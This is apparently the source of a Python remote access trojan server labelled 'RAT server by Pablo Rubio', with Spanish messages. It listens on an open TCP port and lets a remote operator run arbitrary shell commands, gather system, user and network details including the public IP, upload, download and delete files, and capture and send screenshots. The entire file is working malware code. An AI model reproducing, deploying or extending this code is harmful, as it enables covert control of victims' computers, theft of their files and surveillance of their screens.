#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# RAT server by Pablo Rubio

import socket
from socket import error
import threading
import os
import platform
import requests
from subprocess import Popen
from subprocess import PIPE
from gi.repository import Gdk



ip = "0.0.0.0"
port = 45451
max_conections = 5
array = []
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sistema = platform.system()

def admin(socket_client):

    request = socket_client.recv(1024).decode()
    response = ''
    array = request.split(" ")
    print("[*] Mensaje recibido: ", array[0])

    if 'Windows' in sistema:
        
        response = 'Working on it... ;)'
        print(response)


    elif 'Linux' in sistema:
        if 'list' in array[0]:
            response = ("[*] Directorio actual --> ") + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + "/*/*"
            response += ("[*] Listado de archivos --> ") + str(Popen('ls', shell=True, stdout=PIPE).stdout.read()) 

        elif 'info' in array[0]:
            response = "[*] Public IP   -->     " + requests.get('https://checkip.amazonaws.com').text.strip()  + "/*/*"
            response += "[*] Sys_Info 	-->	" + str(Popen('uname -a', shell=True, stdout=PIPE).stdout.read())  + "/*/*"
            response += "[*] User 	-->	" + str(Popen('whoami', shell=True, stdout=PIPE).stdout.read()) + "/*/*"
            response += "[*] Path 	-->	" + str(Popen('pwd', shell=True, stdout=PIPE).stdout.read()) + "/*/*"
            osInfo = platform.uname()
            response += "[*] Pc name	-->	" + str(osInfo[1]) + "/*/*"
            response += "[*] Net_Info 	-->	" + str(Popen('ifconfig', shell=True, stdout=PIPE).stdout.read()) 

        elif 'cd' in array[0]:
            if os.path.isdir(array[1]):
                os.chdir(array[1])
                response = "[*] Directorio actual --> " + array[1]
            else:
                response = "[_] Directorio erroneo."

        elif 'shell' in array[0]:
            command = ''
            for i in array:
                if not 'shell' in i:
                    command += i + ' '
            response = "[*] " + str(Popen(command, shell=True, stdout=PIPE).stdout.read())

        elif 'up' in array[0]:
            path = array[1].split("/")
            name = path[-1]
            f = open(name, "wb")
            socket_client.send(("go").encode())
            print("[*] Receiving...")
            l = socket_client.recv(1024)
            while (l):
                f.write(l)
                l = socket_client.recv(1024)
                print(l)
                if 'fin_archivo' in l.decode():
                    break
            f.close()
            response = "[*] Server --> Archivo recibido."
            socket_client.send(response.encode())
            print("[*] Archivo recibido.")

        elif 'down' in array[0]:
            if os.path.isfile(array[1]):
                f = open(array[1], 'rb')
                print('[*] Sending...')
                l = f.read(1024)
                while (l):
                    socket_client.send(l)
                    l = f.read(1024)
                f.close()
                response = "[*] Server --> Archivo enviado."
                print("[*] Archivo enviado.")
            else:
                response = "[*] Server --> El archivo no existe."
                socket_client.send(('fail').encode())  
                print("[-] El archivo no existe.")

        elif 'close' in array[0]:
            print("[_] Cerrando conexion.")
            server.close()
            socket_client.close()
            exit()

        elif 'delete' in array[0]:
            if os.path.isfile(array[1]):
                os.remove(array[1])
                response = '[*] Archivo borrado exitosamente.'
            elif os.path.isdir(array[1]):
                os.rmdir(array[1])
                response = '[*] Directorio borrado exitosamente.'
            else:
                response = '[-] No se ha podido borrar el archivo/directorio'

        elif 'screenshot' in array[0]:
            window = Gdk.get_default_root_window()
            x, y, width, height = window.get_geometry()
            print("The size of the root window is {} x {}".format(width, height))
            pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
            if (pb != None):
                pb.savev("a1.png","png", (), ())
                response = "ok"
                socket_client.send(response.encode())
                screen = socket_client.recv(1024).decode()
                if 'down' in screen:
                    f = open("a1.png", 'rb')
                    print('[*] Sending...')
                    l = f.read(1024)
                    while (l):
                        socket_client.send(l)
                        l = f.read(1024)
                    f.close()
                    response = "[*] Server --> Archivo enviado."
                    print(response)
                    if os.path.isfile("a1.png"):
                        os.remove("a1.png")

            else:
                response = "fail"

    socket_client.send(response.encode())
    socket_client.close()
    print('')


def main():
    server.bind((ip, port))
    server.listen(max_conections)
    print("[*] Esperando conexiones en ", ip+":", port)

    while(True):
        client, direction = server.accept()
        print("[*] Conexion establecida con ", direction[0]+":", direction[1])
        rat = threading.Thread(target=admin, args=(client,))
        rat.start()


if __name__ == '__main__':

    os.system('clear')
    print("*************************")
    print("RAT Server by Pablo Rubio")
    print("*************************")
    print('')
    main()
